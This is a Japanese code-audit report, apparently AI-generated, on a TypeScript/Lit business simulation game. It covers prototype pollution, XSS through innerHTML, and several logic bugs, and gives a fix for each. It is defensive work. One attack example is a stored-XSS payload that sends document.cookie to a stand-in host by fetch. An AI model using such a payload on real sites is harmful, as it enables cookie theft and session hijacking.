# CTO技術監査レポート — ビジネスエンパイア 2.0

**監査日**: 2026-02-23
**対象**: `/home/ttsuj/Desktop/03_Business-Apps/経営シミュレーション`
**規模**: TypeScript/Vite/Lit、約48ファイル（JS 14 + TS 34）
**手法**: CTO 3レンズ分析 + code-reviewer + debugger + WebSearch多角監査

---

## サマリー

| 分類 | 件数 | 即時対応 |
|------|------|----------|
| **Fatal (F)** | 4件 | リリースブロッカー |
| **Important (I)** | 7件 | 次スプリント必須 |
| **Recommended (R)** | 4件 | 推奨改善 |
| **Enhancement (E)** | 3件 | バックログ |

**総合スコア**: 38/100（Fatal 4件のため自動REJECT）

---

## ゾーン A: セキュリティ（Legacy JS）

### F1: Prototype Pollution — `Object.assign(this, data)`

| 項目 | 詳細 |
|------|------|
| **箇所** | `js/business-game.js:571`, `js/enhanced-business-game.js:779` |
| **攻撃経路** | LocalStorage改ざん → JSON.parse → Object.assign(this, data) |
| **影響** | ゲームオブジェクトの任意メソッド/プロパティ上書き、金額改ざん、`__proto__`汚染 |
| **検証者** | code-reviewer, CTO本体 |

**問題コード:**
```javascript
// business-game.js:568-571
const data = JSON.parse(saveData);  // 未検証JSON
Object.assign(this, data);          // thisの全プロパティ上書き可能
```

**攻撃例:**
```json
{
  "money": 999999999,
  "canAfford": "INJECTED",
  "saveGame": "OVERWRITTEN"
}
```

`canAfford`等のメソッドが文字列で上書き → TypeErrorまたはロジック完全破壊。

**修正案:**
```javascript
// 許可リスト方式に置き換え
const ALLOWED_KEYS = [
    'money', 'turn', 'year', 'month', 'week',
    'marketShare', 'brandPower', 'monthlyRevenue',
    'debt', 'achievements', 'reputation',
    'marketTrend', 'companyStrategy', 'researchPoints'
];
ALLOWED_KEYS.forEach(key => {
    if (Object.prototype.hasOwnProperty.call(data, key)) {
        this[key] = data[key];
    }
});
```

**防御知見（WebSearch）:**
- [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html): `Object.create(null)`で無プロトタイプオブジェクト使用
- [MDN Security](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution): `Object.freeze(Object.prototype)`による防御
- [PortSwigger](https://portswigger.net/web-security/prototype-pollution/preventing): サニタイズ・スキーマバリデーション

---

### F2: 格納型XSS — innerHTML × LocalStorage由来データ

| 項目 | 詳細 |
|------|------|
| **箇所** | `js/game-ui.js:193-222`(従業員), `:237-263`(製品), `:274-296`(市場) |
| **攻撃経路** | LocalStorage改ざん → loadGame → renderXxx() → innerHTML |
| **影響** | Cookie窃取、セッションハイジャック、任意JS実行 |
| **検証者** | code-reviewer, CTO本体 |

**問題コード:**
```javascript
// game-ui.js:205 — emp.name が未サニタイズ
list.innerHTML = state.employees.map(emp => `
    <div class="employee-name">${emp.name}</div>
    <span class="personality">${emp.personality}</span>
`).join('');

// game-ui.js:278 — comp.name, comp.ceo が同様
info.innerHTML = `<strong>${comp.name}</strong>
    <div>CEO: ${comp.ceo}</div>`;
```

**攻撃例:**
```json
{
  "employees": [
    { "name": "<img src=x onerror='fetch(\"https://evil.example/?\"+document.cookie)'>" }
  ]
}
```

**TS版との差異**: `renderers.ts`と`modals.ts`には`escapeHtml()`が定義・使用されている（`renderers.ts:21`, `modals.ts:20`）。Legacy JS側にはこの関数が存在しない。

**修正案:**
```javascript
function escapeHtml(str) {
    if (typeof str !== 'string') return String(str ?? '');
    return str.replace(/&/g, '&amp;').replace(/</g, '&lt;')
              .replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;');
}

// 全innerHTML内のデータ挿入箇所にescapeHtml適用
`<div class="employee-name">${escapeHtml(emp.name)}</div>`
```

---

### F3: XSS — showModal body引数の未エスケープinnerHTML

| 項目 | 詳細 |
|------|------|
| **箇所** | `js/game-ui.js:379`(Legacy), `src/lib/ui/modals.ts:46`(TS) |
| **攻撃経路** | ゲームデータ由来の文字列 → showModal → innerHTML |
| **影響** | モーダル表示時の任意HTML/JS実行 |
| **検証者** | code-reviewer, CTO本体 |

**Legacy JS:**
```javascript
// game-ui.js:379 — bodyが無条件でinnerHTML
this.elements.modalBody.innerHTML = body.replace(/\n/g, '<br>');
```

**TS版:**
```typescript
// modals.ts:43-46 — isHtml=false でも innerHTML を使用
export function showModal(title: string, body: string, isHtml: boolean = false): void {
    document.getElementById('modalTitle')!.textContent = title
    document.getElementById('modalBody')!.innerHTML = isHtml ? body : body.replace(/\n/g, '<br>')
}
```

**問題点**: `isHtml`パラメータに関わらず、常にinnerHTMLが使用される。外部データ由来の文字列が`body`に渡される経路（`result.error`, GameManager経由）が存在する。

**修正案:**
```typescript
export function showModal(title: string, body: string, isHtml: boolean = false): void {
    document.getElementById('modalTitle')!.textContent = title
    const modalBody = document.getElementById('modalBody')!
    if (isHtml) {
        modalBody.innerHTML = body  // 内部生成HTMLのみ許可
    } else {
        modalBody.textContent = body  // 外部データはtextContentで安全に表示
    }
}
```

---

## ゾーン B: コアロジック（Managers）

### F4: 演算子優先度バグ — 能力値平均計算の完全誤り

| 項目 | 詳細 |
|------|------|
| **箇所** | `src/lib/managers/DocumentManager.ts:292` |
| **影響** | `actualBenefit`スケーリング誤り → 市場シェア/ブランド力の成長停滞 |
| **検証者** | debugger |

**問題コード:**
```typescript
// DocumentManager.ts:290-293
const avgAbility = deptEmployees.reduce((sum: number, e: any) => {
    const abilities = e.abilities || {}
    return sum + (abilities.technical || 0 + abilities.sales || 0 + abilities.planning || 0 + abilities.management || 0) / 4
}, 0) / deptEmployees.length
```

**演算子優先度**: `+` > `||` のため、実際の評価は:
```
abilities.technical || (0 + abilities.sales) || (0 + abilities.planning) || (0 + abilities.management || 0)
```

**手計算（technical=80, sales=60, planning=40, management=50）:**

| | 計算式 | 結果 |
|--|--|--|
| **バグあり** | `80 \|\| 60 \|\| 40 \|\| 50` → `80`, `80/4` = `20` | avgAbility = **20** |
| **正しい意図** | `(80+60+40+50) / 4` | avgAbility = **57.5** |

**影響の連鎖:**
```
avgAbility 過小評価（20 vs 57.5）
  → doc.actualBenefit * (20/60) = 33%スケール（本来96%）
    → calculateOutcome: marketShareChange 常に0.1（本来0.3の場合あり）
    → calculateOutcome: brandPowerChange 常に0（本来1の場合あり）
      → 市場シェア・ブランド力の成長が3倍遅い
```

**修正:**
```typescript
return sum + ((abilities.technical || 0) + (abilities.sales || 0) + (abilities.planning || 0) + (abilities.management || 0)) / 4
```

---

### I1: pruneHistory二重計上バグ

| 項目 | 詳細 |
|------|------|
| **箇所** | `src/lib/managers/DocumentManager.ts:635-643` |
| **影響** | documentStats過大計上 → UI表示矛盾（処理数 < 承認数+却下数） |
| **検証者** | debugger |

**問題コード:**
```typescript
export function pruneHistory(state: any): void {
  if (state.documentHistory.length > CEO_BALANCE.maxDocumentHistory) {
    const excess = state.documentHistory.splice(0, ...)
    for (const doc of excess) {
      if (doc.verdict === 'approve') state.documentStats.totalApproved++   // 二重カウント
      if (doc.verdict === 'reject') state.documentStats.totalRejected++    // 二重カウント
    }
  }
}
```

`processVerdict`（358-364行）で既にカウント済みのドキュメントを、pruneHistoryで再カウント。

**修正:**
```typescript
export function pruneHistory(state: any): void {
  if (state.documentHistory.length > CEO_BALANCE.maxDocumentHistory) {
    state.documentHistory.splice(0, state.documentHistory.length - CEO_BALANCE.maxDocumentHistory)
    // カウントはprocessVerdictで加算済み — ここでは不要
  }
}
```

---

### I2: `window.*?.()` サイレント失敗パターン

| 項目 | 詳細 |
|------|------|
| **箇所** | `src/lib/managers/GameManager.ts` — 38箇所 |
| **影響** | windowBridge読み込み順依存、初期化不完全時に無言で失敗 |
| **検証者** | CTO本体 |

```typescript
;(window as any).generateNews?.()    // 211行
;(window as any).updateDisplay?.()   // 212行
;(window as any).updateRanking?.()   // 213行
;(window as any).initCharts?.()      // 214行
;(window as any).showPanel?.(null, getActivePanel())  // 215行
```

**問題**: `windowBridge.ts`が34関数をwindowにバインドする設計だが、`GameManager.ts`内で呼ばれるUI関数のうち`generateNews`, `updateDisplay`, `renderActivePanel`, `updateRanking`, `initCharts`, `updateCompetitors`, `checkAchievements`, `advanceTutorialByAction`の8つは**windowBridge.tsでバインドされていない**。Optional Chaining (`?.`) によりエラーにならず無言で失敗する。

**修正方針**: windowBridge.tsに不足関数を追加するか、直接importに移行。

---

### I3: 前提資格スキップでS級資格が不正出現

| 項目 | 詳細 |
|------|------|
| **箇所** | `src/lib/qualificationGenerator.ts:54-55` |
| **影響** | ゲームバランス崩壊（低レベルキャラにS級資格が出現） |
| **検証者** | CTO本体 |

```typescript
// qualificationGenerator.ts:54-55
// 前提資格チェック（簡易版 - 実装時は要改善）
// 現状は前提条件をスキップ
```

能力値の最低ラインはチェックしているが、前提資格（例: A級取得者のみS級を取得可能）のバリデーションが完全にスキップされている。

---

### I4: modals.ts 6 TODO — HRManager未接続

| 項目 | 詳細 |
|------|------|
| **箇所** | `src/lib/ui/modals.ts` — 228, 230, 271, 283, 709, 872行 |
| **影響** | 採用・昇進・スキルツリーの機能不完全 |
| **検証者** | CTO本体 |

```typescript
// modals.ts:228
// TODO: Manager接続 - updateDisplay() を呼び出す
// modals.ts:230
// TODO: Manager接続 - generateCandidateForDepartment を HRManager から import
// modals.ts:709
// TODO: Manager接続 - canPromote を HRManager から import
```

UI層にゲームロジック（候補者生成、昇進判定等）がハードコードされている状態。

---

### I5: crypto.subtle HTTP環境クラッシュ

| 項目 | 詳細 |
|------|------|
| **箇所** | `src/lib/storage.ts:154` |
| **影響** | HTTP環境（localhost除く）でセーブ検証が例外スロー |
| **検証者** | CTO本体 |

```typescript
// storage.ts:150-157
async function calculateChecksum(data: unknown): Promise<string> {
  const jsonString = JSON.stringify(data)
  const encoder = new TextEncoder()
  const dataBuffer = encoder.encode(jsonString)
  const hashBuffer = await crypto.subtle.digest('SHA-256', dataBuffer)  // HTTP環境でundefined
  // ...
}
```

`crypto.subtle`はセキュアコンテキスト（HTTPS/localhost）でのみ利用可能。HTTP環境では`crypto.subtle`が`undefined`となり、`digest`呼び出しでTypeError。

**修正案:**
```typescript
async function calculateChecksum(data: unknown): Promise<string> {
  const jsonString = JSON.stringify(data)
  if (typeof crypto?.subtle?.digest !== 'function') {
    // フォールバック: 簡易ハッシュまたはスキップ
    console.warn('crypto.subtle not available (HTTP context), skipping checksum')
    return 'no-checksum'
  }
  // 既存のSHA-256ロジック
}
```

---

### I6: 任意メソッド呼び出し — executeGameAction

| 項目 | 詳細 |
|------|------|
| **箇所** | `js/game-ui.js:439-440` |
| **影響** | XSSと組み合わせてゲームオブジェクトの任意メソッド実行 |
| **検証者** | code-reviewer |

```javascript
executeGameAction(action, ...args) {
    const result = this.game[action](...args);  // actionの検証なし
}
```

**修正**: `ALLOWED_ACTIONS` ホワイトリスト追加。

---

### I7: 実績重複付与

| 項目 | 詳細 |
|------|------|
| **箇所** | `js/business-game.js:495-501` |
| **影響** | 同じ実績が毎月重複追加、報酬が複数回付与 |
| **検証者** | code-reviewer |

```javascript
checkAchievements() {
    ACHIEVEMENTS.forEach(achievement => {
        if (achievement.condition(this)) {
            this.achievements.push(achievement.id);     // 重複チェックなし
            this.applyAchievementReward(achievement.reward);
        }
    });
}
```

**修正**: `!this.achievements.includes(achievement.id) &&` 条件追加。

---

## ゾーン C: UI/XSS層

### innerHTML使用箇所マップ

| ファイル | innerHTML数 | escapeHtml使用 | リスク |
|----------|-------------|----------------|--------|
| `renderers.ts` | 13箇所 | 3箇所で使用 | **中** — `product.name`, `emp.name`等は未エスケープ |
| `modals.ts` | 2箇所(直接) | 7箇所で使用 | **低** — 大部分がescapeHtml済み |
| `game-ui.js` | 6箇所 | **0箇所** | **致命的** — 全く未対策 |
| `enhanced-ui.js` | 12箇所 | **0箇所** | **致命的** — 全く未対策 |

**escapeHtml関数の重複定義**: 4箇所（`modals.ts:20`, `renderers.ts:21`, `game.ts:750`, `main.ts:473`）で同一関数が重複定義されている。一元化が必要。

---

## ゾーン D: インフラ

### R1: O(n²) チーム相性計算

| 項目 | 詳細 |
|------|------|
| **箇所** | `src/lib/managers/HRManager.ts:23-52` |
| **影響** | 従業員50人で1,225回ループ（各レンダリング時） |

```typescript
for (let i = 0; i < employees.length; i++) {
    for (let j = i + 1; j < employees.length; j++) {
        // 相性計算
    }
}
```

`renderEmployees()` (`renderers.ts:508`) が毎回 `calculateTeamCompatibility(game.employees)` を呼び出す。n=50 で `n*(n-1)/2 = 1,225` ペア計算。

**最適化案**: 相性スコアをキャッシュし、従業員リスト変更時のみ再計算。

**参考**: [Game Optimization Guide 2025](https://generalistprogrammer.com/tutorials/game-optimization-complete-performance-guide-2025/) — Object pooling + memoization patterns

---

### R2: 未使用/過剰依存

| パッケージ | 状況 |
|-----------|------|
| `markdown-it` | package.jsonに記載あるがsrc内での使用箇所なし |
| `@lit-labs/signals` | Lit signals — 使用箇所要確認 |
| `signal-utils` | 同上 |
| `@vitejs/plugin-legacy` | devDependencyだが、Legacy JS (`js/`) の存在を考えると有効 |

---

### R3: tsconfig.json — 全strict設定OFF

```json
{
  "strict": false,
  "noUnusedLocals": false,
  "noUnusedParameters": false,
  "noFallthroughCasesInSwitch": false,
  "noImplicitAny": false,
  "noImplicitThis": false,
  "strictNullChecks": false
}
```

**全フラグがfalse** — 型安全性がゼロ。any暗黙許可のためバグF4のような演算子優先度問題が型チェックで検出できない。

**段階的移行計画** ([TypeScript strict mode guide](https://oneuptime.com/blog/post/2026-02-20-typescript-strict-mode-guide/view)):

| Phase | フラグ | 予想エラー数 | リスク |
|-------|--------|------------|--------|
| 1 | `noImplicitAny: true` | 200-400 | 低 — `any`型付けで段階対応可 |
| 2 | `strictNullChecks: true` | 300-600 | 中 — null/undefined分岐が大量発生 |
| 3 | `strict: true` | 残り100-200 | 低 — Phase 1-2で大部分解決済み |

**重要**: [TypeScript strictness is non-monotonic](https://huonw.github.io/blog/2025/12/typescript-monotonic/) — `noImplicitAny`を先に有効化してから`strictNullChecks`を有効化すると、エラーが一貫して減少する。逆順だとエラーが増加する場合がある。

---

### R4: Chart.js 初期化改善

`charts.ts`はグローバルスコープでChart.register()を実行しており、動的importやtree-shakingの最適化を阻害している。

---

### E1: innerHTML → Lit html テンプレートリテラル移行

TS側UIの`renderers.ts`と`modals.ts`は、Litの`html`テンプレートリテラル（自動エスケープ付き）に段階的に移行すべき。Litは既にdependencyに含まれている。

### E2: vitest導入

`package.json`に`"test": "vitest"`のスクリプトが定義済みだが、`vitest`はdevDependenciesに未追加。テストファイルも存在しない。

### E3: strict完全移行（R3のPhase 3完了後）

---

## セキュリティ修正案 — F1-F3 Before/After

### F1: Object.assign → 許可リスト

```diff
- Object.assign(this, data);
+ const ALLOWED = ['money','turn','year','month','week','marketShare','brandPower',
+     'monthlyRevenue','debt','achievements','reputation','marketTrend',
+     'companyStrategy','researchPoints'];
+ ALLOWED.forEach(k => {
+     if (Object.prototype.hasOwnProperty.call(data, k)) this[k] = data[k];
+ });
```

### F2: innerHTML → escapeHtml

```diff
- <div class="employee-name">${emp.name}</div>
+ <div class="employee-name">${escapeHtml(emp.name)}</div>

- <strong>${comp.name}</strong>
+ <strong>${escapeHtml(comp.name)}</strong>

- <div>CEO: ${comp.ceo}</div>
+ <div>CEO: ${escapeHtml(comp.ceo)}</div>
```

### F3: showModal安全化

```diff
  showModal(title, body) {
      this.elements.modalTitle.textContent = title;
-     this.elements.modalBody.innerHTML = body.replace(/\n/g, '<br>');
+     this.elements.modalBody.textContent = body;
  }
+ showModalHtml(title, trustedHtml) {
+     this.elements.modalTitle.textContent = title;
+     this.elements.modalBody.innerHTML = trustedHtml;
+ }
```

---

## アーキテクチャ改善ロードマップ

### Sprint 1（即時）: セキュリティ修正
- [ ] F1: Object.assign排除（business-game.js, enhanced-business-game.js）
- [ ] F2: Legacy JS全innerHTML箇所にescapeHtml導入
- [ ] F3: showModal安全化（Legacy JS + TS）
- [ ] F4: DocumentManager.ts:292 演算子優先度修正

### Sprint 2（1週間）: ロジックバグ修正
- [ ] I1: pruneHistory二重計上修正
- [ ] I2: windowBridge不足関数追加（8関数）
- [ ] I5: crypto.subtleフォールバック追加
- [ ] I6: executeGameActionホワイトリスト
- [ ] I7: 実績重複チェック追加

### Sprint 3（2-3週間）: 構造改善
- [ ] I3: 前提資格チェック実装
- [ ] I4: modals.ts 6 TODO解消（HRManager接続）
- [ ] R1: calculateTeamCompatibilityキャッシュ化
- [ ] R2: 未使用依存整理
- [ ] escapeHtml関数の4重複を一元化

### Sprint 4（1ヶ月）: 型安全化
- [ ] R3 Phase 1: noImplicitAny有効化
- [ ] R3 Phase 2: strictNullChecks有効化
- [ ] E2: vitest導入 + コアロジックテスト追加

### Sprint 5（長期）: モダン化
- [ ] E1: innerHTML → Lit html段階移行
- [ ] E3: strict完全移行
- [ ] R4: Chart.js動的import化

---

## 検証方法

### F4（演算子優先度）
```
修正前: technical=80 → avgAbility=20 → actualBenefit*0.33
修正後: technical=80, sales=60, planning=40, management=50
        → avgAbility=57.5 → actualBenefit*0.96
```

### F1-F3（XSS/pollution）
修正後コードで以下を確認:
- `Object.assign(this, data)` の完全除去
- `innerHTML`にデータ挿入する全箇所で`escapeHtml()`適用
- `showModal`のbody引数がtextContent経由

### I1（pruneHistory）
```
修正前: processVerdict(approve) → totalApproved=1
        pruneHistory(exceed) → totalApproved=2  ← 二重
修正後: processVerdict(approve) → totalApproved=1
        pruneHistory(exceed) → totalApproved=1  ← 変化なし
```

---

## 参考情報源

- [OWASP Prototype Pollution Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html)
- [MDN: Prototype Pollution](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution)
- [PortSwigger: Preventing Prototype Pollution](https://portswigger.net/web-security/prototype-pollution/preventing)
- [Game Optimization Guide 2025](https://generalistprogrammer.com/tutorials/game-optimization-complete-performance-guide-2025)
- [TypeScript Strict Mode Guide 2026](https://oneuptime.com/blog/post/2026-02-20-typescript-strict-mode-guide/view)
- [TypeScript Strictness Non-Monotonicity](https://huonw.github.io/blog/2025/12/typescript-monotonic/)
- [Figma: Strict Null Checks Case Study](https://www.figma.com/blog/inside-figma-a-case-study-on-strict-null-checks/)

---

*Generated by CTO 3-Lens Analysis + code-reviewer + debugger + WebSearch multi-AI audit*
